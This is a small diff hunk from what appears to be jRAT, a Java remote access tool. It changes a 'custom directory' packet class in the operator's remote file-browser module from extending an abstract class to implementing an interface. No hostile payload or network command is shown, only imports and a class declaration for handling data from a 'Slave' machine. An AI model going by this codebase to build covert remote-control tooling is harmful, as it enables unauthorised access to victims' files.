@@ -1,10 +1,10 @@
 package jrat.module.fs.packets;
 
 import jrat.controller.Slave;
-import jrat.controller.packets.incoming.AbstractIncomingPacket;
+import jrat.controller.packets.incoming.IncomingPacket;
 import jrat.module.fs.ui.FrameRemoteFiles;
 
-public class Packet34CustomDirectory extends AbstractIncomingPacket {
+public class Packet34CustomDirectory implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
